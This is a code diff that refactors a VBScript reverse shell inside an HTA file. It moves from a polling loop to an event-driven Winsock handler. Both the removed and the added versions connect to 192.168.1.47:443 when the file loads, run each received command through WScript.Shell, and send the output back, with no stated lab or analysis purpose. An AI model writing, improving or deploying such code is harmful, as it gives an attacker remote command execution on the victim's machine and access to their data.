@@ -2,48 +2,32 @@
 <head>
     <hta:application id="app" border="none" />
     <script language="VBScript">
-        Dim ws, shell, cmd, output, server, port, connection
+        Dim ws, conn, cmd, result
         Set ws = CreateObject("WScript.Shell")
+        Set conn = CreateObject("MSWinsock.Winsock")
+
         server = "192.168.1.47"
         port = 443
-        
-        On Error Resume Next
-        Set connection = CreateObject("MSWinsock.Winsock")
-        connection.RemoteHost = server
-        connection.RemotePort = port
-        connection.Connect
-        
-        Do While connection.Connected <> 1
-            WScript.Sleep 100
-        Loop
-        
-        connection.SendData "Connected to " & server & ":" & port & vbCrLf
-        
-        Do
-            On Error Resume Next
-            WScript.Sleep 100
-            If connection.BytesReceived > 0 Then
-                connection.GetData cmd
-                If cmd = "exit" Then
-                    Exit Do
-                End If
-                
-                Set shell = ws.Exec(cmd)
-                Do Until shell.Status
-                    WScript.Sleep 100
-                Loop
-                
-                output = shell.StdOut.ReadAll
-                If shell.StdErr.AtEndOfStream = False Then
-                    output = output & vbCrLf & "Error: " & shell.StdErr.ReadAll
-                End If
-                
-                connection.SendData output
+
+        Sub conn_OnDataArrival(bytesTotal)
+            conn.GetData cmd, 8  ' 8 means data type is string
+            If cmd = "exit" Then
+                window.close
+            Else
+                On Error Resume Next
+                Set exec = ws.Exec(cmd)
+                result = exec.StdOut.ReadAll() & exec.StdErr.ReadAll()
+                conn.SendData result
             End If
-        Loop
-        
-        connection.Close
-        window.close
+        End Sub
+
+        Sub ConnectToServer()
+            conn.RemoteHost = server
+            conn.RemotePort = port
+            conn.Connect
+        End Sub
+
+        ConnectToServer()
     </script>
 </head>
 <body>
